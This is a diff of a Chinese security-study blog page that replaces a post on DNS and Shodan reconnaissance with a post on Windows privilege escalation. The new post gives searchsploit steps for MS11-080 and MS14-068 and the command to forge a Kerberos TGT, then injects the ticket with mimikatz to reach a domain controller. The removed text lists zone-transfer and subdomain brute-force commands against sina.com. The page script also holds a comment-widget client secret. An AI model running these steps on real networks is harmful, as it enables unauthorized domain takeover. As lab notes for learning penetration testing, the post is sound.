@@ -157,7 +157,7 @@
     </script>
     
     <script defer type="text/javascript" src="/js/custom.js"></script>
-    <title>被动信息收集-DNS与SHODAN | Pyrrhax</title>
+    <title>提权-利用漏洞提权 | Pyrrhax</title>
   <meta name="generator" content="Hexo 4.2.1"></head>
   <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
     
@@ -203,7 +203,7 @@
   
   <article class="article post card" itemscope itemtype="http://schema.org/Article">
     <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/30/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DNS%E4%B8%8ESHODAN/">
+      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/22/%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">
       <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
        <meta itemprop="name" content="Pyrrhax">
        <meta itemprop="description" content="">
@@ -214,11 +214,11 @@
       </span>
     </div>
     <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">被动信息收集-DNS与SHODAN</h1>
+      <h1 class="post-title" itemprop="name headline">提权-利用漏洞提权</h1>
       <div class="post-meta">
         
         <span class="post-date">
-          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-08-30T12:06:37+08:00">2020-08-30 12:06:37</time></span>
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-09-22T21:04:03+08:00">2020-09-22 21:04:03</time></span>
         </span>
         
         
@@ -236,120 +236,57 @@
       </div>
     </header>
     <main class="post-main" itemprop="articleBody">
-      <h1 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h1><ul>
-<li>IP地址段</li>
-<li>域名信息</li>
-<li>邮件地址</li>
-<li>文档图片数据</li>
-<li>公司地址</li>
-<li>公司组织架构</li>
-<li>联系电话/传真号码</li>
-<li>人员姓名/职务</li>
-<li>目标系统使用的技术架构</li>
-<li>公开的商业信息</li>
+      <h2 id="提权-利用漏洞提权"><a href="#提权-利用漏洞提权" class="headerlink" title="提权-利用漏洞提权"></a>提权-利用漏洞提权</h2><h2 id="Ms11-080"><a href="#Ms11-080" class="headerlink" title="Ms11-080"></a>Ms11-080</h2><ul>
+<li><p>Kb2592799</p>
+<ul>
+<li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li>
 </ul>
+</li>
+<li><p>先把python编译成exe，再在目标机器执行</p>
 <a id="more"></a>
 
-
-
-<h1 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h1><ul>
-<li>用信息描述目标</li>
-<li>发现</li>
-<li>社会工程学攻击</li>
-<li>物理缺口</li>
-</ul>
-<h1 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h1><ul>
-<li><p>域名解析成IP地址</p>
 <ul>
-<li>域名与FQDN的区别</li>
-<li>域名记录：A、C name、NS、MX、ptr</li>
-</ul>
-</li>
-<li><p>nslookup</p>
-<ul>
-<li>set q=a、ns、mx、any</li>
-<li>server</li>
-<li>nslookup -q=any 163.com </li>
+<li><a href="https://pypi.org/project/pywin32/" target="_blank" rel="noopener">https://pypi.org/project/pywin32/</a> (pyinstaller会调用pywin32)</li>
+<li>pyinstaller.org</li>
 </ul>
 </li>
 </ul>
-<p>/etc/resolv.conf</p>
-<ul>
-<li>dig<ul>
-<li>dig +noall +answer mail.163.com|awk ‘{print $5}’</li>
-<li>反向查询<code>dig -x xx.x.x.xx</code> </li>
-<li>bind版本信息<code>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</code></li>
-<li>DNS追踪：<code>dig +trace example.com</code>直接向根域名服务器发起查询</li>
-</ul>
-</li>
-<li>dig +trace查询过程抓包<ul>
-<li>向本地DNS服务器查询root的NS记录，得到13个DNS根服务器名称 X.root-server.net </li>
-<li>向本地DNS服务器查询 X.root-server.net对应的A记录</li>
-<li>随机选择一个 X.root-server.net 查询sina.com的A记录，得到13个COM顶级域名服务器名称</li>
-<li>向本地DNS服务器查询X.gtld-server.net对应的A记录</li>
-<li>随机选择一个X.gtld-server.net 查询sina.com的A记录，得到7个sina.com的权威域名服务器名称</li>
-<li>向本地DNS服务器查询七个权威域名服务器的A记录</li>
-<li>向权威域名服务器查询sina.com的A记录，得到sina.com对应的IP</li>
-</ul>
-</li>
-</ul>
-<h1 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h1><ul>
-<li>type: AXFR</li>
-<li>dig @ns1.example.com example.com axfr</li>
-<li>host -T -l sina.com</li>
-</ul>
-<h1 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h1><ul>
-<li>fierce -dnsserver 8.8.8.8  -dns sina.com.cn -wordlist a.txt</li>
-<li>dnsdict6 -d4 -t 16 -x sina.com</li>
-<li>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</li>
-<li>dnsmap sina.com -w dns.txt</li>
-<li>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</li>
-<li>dnsrecon -t std -d sina.com</li>
-<li>将多个字典集成1个大字典，熟练使用一两个dns爆破命令。</li>
-</ul>
-<h1 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h1><ul>
-<li>Whois</li>
-<li>whois -h whois.apnic.net 192.0.43.10</li>
-</ul>
-<h1 id="信息搜集——搜索引擎"><a href="#信息搜集——搜索引擎" class="headerlink" title="信息搜集——搜索引擎"></a>信息搜集——搜索引擎</h1><ul>
-<li><p>公司新闻动态</p>
-</li>
-<li><p>重要雇员信息</p>
-</li>
-<li><p>机密文档/网络拓扑</p>
-</li>
-<li><p>用户名密码</p>
-</li>
-<li><p>目标系统软硬件技术架构</p>
-</li>
-<li><p>Google Hacking、Baidu Hacking、Bing Hacking</p>
-</li>
-</ul>
-<h1 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h1><ul>
-<li><p>搜索互联网的设备</p>
-</li>
-<li><p>Banner:http、ftp、ssh、telnet</p>
-</li>
-<li><p><a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a></p>
-</li>
-<li><p>常见filter</p>
-</li>
-<li><p>net(192.168.20.1)</p>
-</li>
-<li><p>city</p>
-</li>
-<li><p>country(CN、US)</p>
-</li>
-<li><p>port(80、21、22、23)</p>
-</li>
-<li><p>os</p>
-</li>
-<li><p>Hostname(主机域名)</p>
-</li>
-<li><p>server</p>
-</li>
-</ul>
+<figure class="hljs highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit ms11-080<br>cp /usr/share/exploitdb/exploits/windows/local/18176.py .<br></code></pre></td></tr></table></figure>
 
+<ul>
+<li>如果目标机器有python环境，直接执行就可以。</li>
+</ul>
+<h2 id="Ms14-068"><a href="#Ms14-068" class="headerlink" title="Ms14-068"></a>Ms14-068</h2><ul>
+<li><p>从本机管理员权限获取域管理员权限</p>
+</li>
+<li><ol>
+<li><code>searchsploit ms14-068</code>得到35474.py</li>
+<li><code>cp /usr/share/exploitdb/exploits/windows/remote/35474.py ~/ms14-068.py</code></li>
+<li>在windows通过kali /usr/share/windows-resources/binaries/whoami.exe得到域用户的sid，还需要域控制器的ip。</li>
+<li>使用漏洞利用代码生成TGT票据（kerbros协议的票据）<ul>
+<li><code>python ms14-068.py -u u1@lab.com -s S-1-5-21-1226907004-2355705551-2341087478-1109 -d 192.168.0.119</code></li>
+<li>输入u1域用户的密码</li>
+</ul>
+<ol start="5">
+<li>拷贝票据到windows系统</li>
+</ol>
+</li>
+<li>通过minikatz完成提权<ul>
+<li><code>kerberos::ptc TGT_u1@lab.com.ccache</code> </li>
+</ul>
+</li>
+<li>发现可以访问域控制器的C盘</li>
+</ol>
+<ul>
+<li>如果kali缺少python库文件，下载地址：<a href="https://github.com/bidord/pykek" target="_blank" rel="noopener">https://github.com/bidord/pykek</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="其它："><a href="#其它：" class="headerlink" title="其它："></a>其它：</h2><p>Ms08-067</p>
+<p>Ms09-001</p>
+<p>Ms10-017</p>
+<p>Ms12-020</p>
+<h3 id="Kali修改默认python为python3"><a href="#Kali修改默认python为python3" class="headerlink" title="Kali修改默认python为python3"></a>Kali修改默认python为python3</h3><figure class="hljs highlight plain"><figcaption><span>/usr/bin/python```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rm"><br>&#96;&#96;&#96;ln -s &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;python<br></code></pre></td></tr></table></figure>
     </main>
     <footer class="post-footer">
       
@@ -366,12 +303,10 @@
   <nav class="page-nav">
     <div class="page-nav-next page-nav-item">
       
-      <a href="/2020/08/28/WireShark&TCPdump/" rel="next" title="WireShark&TCPdump"><i class="fas fa-angle-left"></i><span class="nav-title">WireShark&TCPdump</span></a>
+      <a href="/2020/09/22/Windows%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%8F%8A%E5%B7%A5%E4%BD%9C%E7%BB%84-%E5%9F%9F/" rel="next" title="Windows身份认证过程及工作组/域"><i class="fas fa-angle-left"></i><span class="nav-title">Windows身份认证过程及工作组/域</span></a>
       
     </div>
     <div class="page-nav-prev page-nav-item">
-      
-      <a href="/2020/08/31/GoogleHacking%E3%80%81Recon-ng/" rel="prev" title="GoogleHacking、Recon-ng"><span class="nav-title">GoogleHacking、Recon-ng</span><i class="fas fa-angle-right"></i></a>
       
     </div>
   </nav>
@@ -398,7 +333,7 @@
       "client_secret": "71b8ae2203a2a15d590a6866959b732267194412",
       "no_comment": "这个页面还没有评论，现在就去评论吧！",
       "go_to_comment": "去评论",
-      "issue_title": "被动信息收集-DNS与SHODAN",
+      "issue_title": "提权-利用漏洞提权",
       "btn_class": "button",
       "comments_target": "#comment-thread"
     });
@@ -493,7 +428,7 @@
     <hr>
     <div class="post-toc sidebar-item" id="toc-div">
       <div><i class="fas fa-list-ol"></i>文章目录</div>
-      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#信息收集内容"><span class="toc-text">信息收集内容</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#信息用途"><span class="toc-text">信息用途</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#信息收集——DNS"><span class="toc-text">信息收集——DNS</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#DNS区域传输"><span class="toc-text">DNS区域传输</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#DNS字典爆破"><span class="toc-text">DNS字典爆破</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#DNS注册信息"><span class="toc-text">DNS注册信息</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#信息搜集——搜索引擎"><span class="toc-text">信息搜集——搜索引擎</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#SHODAN"><span class="toc-text">SHODAN</span></a></li></ol></div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#提权-利用漏洞提权"><span class="toc-text">提权-利用漏洞提权</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Ms11-080"><span class="toc-text">Ms11-080</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Ms14-068"><span class="toc-text">Ms14-068</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#其它："><span class="toc-text">其它：</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Kali修改默认python为python3"><span class="toc-text">Kali修改默认python为python3</span></a></li></ol></li></ol></div>
     </div>
     
     
